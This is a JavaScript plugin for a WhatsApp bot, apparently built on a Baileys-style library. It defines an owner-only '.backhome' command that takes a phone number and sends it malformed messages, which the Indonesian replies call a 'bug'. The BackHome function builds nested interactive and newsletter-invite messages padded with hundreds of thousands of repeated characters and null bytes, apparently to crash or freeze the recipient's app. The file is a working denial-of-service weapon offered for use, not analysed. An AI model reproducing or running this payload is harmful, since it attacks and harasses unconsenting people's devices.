const config = require('../../config')
const te = require('../../src/lib/zerotwo-error.js')

const pluginConfig = {
    name: 'backhome',
    alias: ['bh', 'backbug', 'homebug'],
    category: 'owner',
    description: 'Back Home bug (owner only)',
    usage: '.backhome <target>',
    example: '.backhome 628xxx',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 60,
    energi: 0,
    isEnabled: true
}

async function BackHome(sock, target) {
    const msg = {
        groupMentionedMessage: {
            message: {
                ephemeralMessage: {
                    message: {
                        viewOnceMessage: {
                            message: {
                                interactiveMessage: {
                                    body: {
                                        text: '꧀꧔꧀꧔🪐'
                                    },
                                    nativeFlowMessage: {
                                        extra: '\u31040',
                                        buttons: '?⃟꙰'.repeat(20000),
                                        extra1: '?⃟꙰'.repeat(5555)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    await sock.relayMessage(target, msg, {})

    await sock.relayMessage(
        target,
        {
            newsletterAdminInviteMessage: {
                newsletterJid: '123@newsletter',
                inviteCode: '\r'.repeat(150000) + '\n'.repeat(50000),
                inviteExpiration: 99999999999,
                newsletterName: 'Bang Sv Uciha' + '\u0000'.repeat(250000)
            }
        },
        {}
    )
}

async function handler(m, { sock }) {
    if (!config.isOwner(m.sender)) {
        return m.reply(
`╭━━━〔 🔒 OWNER ONLY 〕━━━⬣
│
│ > Command ini cuma buat owner!
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    const text = m.text?.trim()

    if (!text) {
        return m.reply(
`╭━━━〔 💀 BACK HOME 〕━━━⬣
│
│ ✨ *Back Home Bug*
│
│ 📌 *Format:*
│ > ${m.prefix}backhome <target>
│
│ 📌 *Contoh:*
│ > ${m.prefix}backhome 628xxx
│ > ${m.prefix}backhome 628xxx@s.whatsapp.net
│
│ ⚠️ *Warning:*
│ > Gunakan dengan tanggung jawab
│ > Owner only!
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    await m.react('💀')

    try {
        let target = text

        if (!target.includes('@')) {
            const cleanNum = target.replace(/[^0-9]/g, '')
            if (!cleanNum || cleanNum.length < 6) {
                await m.react('❌')
                return m.reply(
`╭━━━〔 ❌ TARGET INVALID 〕━━━⬣
│
│ > Nomor target tidak valid!
│
╰━━━━━━━━━━━━━━━━⬣`
                )
            }
            target = cleanNum + '@s.whatsapp.net'
        }

        await m.reply(
`╭━━━〔 💀 PROCESSING 〕━━━⬣
│
│ ⏳ *Mengirim bug ke:*
│ > \`${target}\`
│
│ 💡 _Tunggu bentar..._
│
╰━━━━━━━━━━━━━━━━⬣`
        )

        await BackHome(sock, target)

        await m.react('✅')

        return m.reply(
`╭━━━〔 ✅ SUCCESS 〕━━━⬣
│
│ 💀 *Bug berhasil dikirim!*
│
│ 🎯 *Target:* \`${target}\`
│ 📊 *Method:* Back Home
│
│ ⚠️ _Gunakan dengan bijak!_
│
╰━━━━━━━━━━━━━━━━⬣`
        )

    } catch (error) {
        await m.react('❌')
        console.error('[BACKHOME Error]', error)

        return m.reply(
`╭━━━〔 ❌ ERROR 〕━━━⬣
│
│ 📛 *Error:*
│ > ${error.message.slice(0, 200)}
│
│ 💡 Coba lagi nanti
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }
}

module.exports = {
    config: pluginConfig,
    handler,
    BackHome
}